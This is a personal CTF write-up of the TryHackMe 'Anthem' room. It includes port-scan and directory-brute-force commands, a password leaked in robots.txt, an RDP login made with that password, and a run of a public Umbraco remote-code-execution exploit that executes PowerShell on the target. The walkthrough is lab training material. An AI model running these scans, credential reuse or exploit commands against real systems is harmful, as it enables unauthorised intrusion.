
https://tryhackme.com/r/room/anthem

---
#### Nmap
```shell
sudo nmap -n -Pn -sS -p- --open -min-rate 5000 -vvv 10.10.186.19
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 11:11 CEST  
Initiating SYN Stealth Scan at 11:11  
Scanning 10.10.186.19 [65535 ports]  
Discovered open port 3389/tcp on 10.10.186.19  
Discovered open port 80/tcp on 10.10.186.19  
Completed SYN Stealth Scan at 11:12, 26.38s elapsed (65535 total ports)  
Nmap scan report for 10.10.186.19  
Host is up, received user-set (0.030s latency).  
Scanned at 2024-07-25 11:11:45 CEST for 26s  
Not shown: 65533 filtered tcp ports (no-response)  
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit  
PORT     STATE SERVICE       REASON  
80/tcp   open  http          syn-ack ttl 127  
3389/tcp open  ms-wbt-server syn-ack ttl 127  
  
Read data files from: /usr/bin/../share/nmap  
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds  
          Raw packets sent: 131088 (5.768MB) | Rcvd: 22 (968B)
```

#### Enum
```shell
feroxbuster -u http://10.10.186.19 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -x txt  
,php,html -C 404
```

Nikto showed me what I should looking for firstly, the **`robots.txt`**.
In it we have the name of the CMS `Umbraco`, the password `UmbracoIsTheBest!` and 4 locations:
```text
UmbracoIsTheBest!

# Use for all search robots
User-agent: *

# Define the directories not to crawl
Disallow: /bin/
Disallow: /config/
Disallow: /umbraco/
Disallow: /umbraco_client/
```

There is 4 flags to find in the DOM, so I used `wget` to download the blog
```shell
wget -r -np -k -p http://anthem.com
```

Then I used `grep` to get the 4 flags
```shell
grep -ri "thm" ./*
```

Then put de poem on google and you got the `Solomon Grundy` username and his email `sg@anthem.com`

So we have `Jane Doe` and `Solomon Grundy`  

Solomon's email is the username for connecting on `/umbraco/`, the creds are `sg@anthem.com:UmbracoIsTheBest!`

I tried for hours a way to get in with a working PoC but the solution was simply to connect through rdp with `SG:UmbracoIsTheBest!` user
```shell
xfreerdp /u:SG /p:UmbracoIsTheBest! /v:10.10.14.4 /dynamic-resolution /cert:ignore +clipboard /drive:share,/rdp  
/sec:tls
```

The python [PoC](https://www.exploit-db.com/exploits/49488)
```shell
python3 49488.py -u sg@anthem.com -p UmbracoIsTheBest! -i 'http://anthem.com' -c powershell.exe -a '-NoProfile -  
Command ls C:\\Users'
```
This gave me the `SG` user

Fuck this room for now, I'll take my revenge later. 
@me Use the `xfreerdp` command above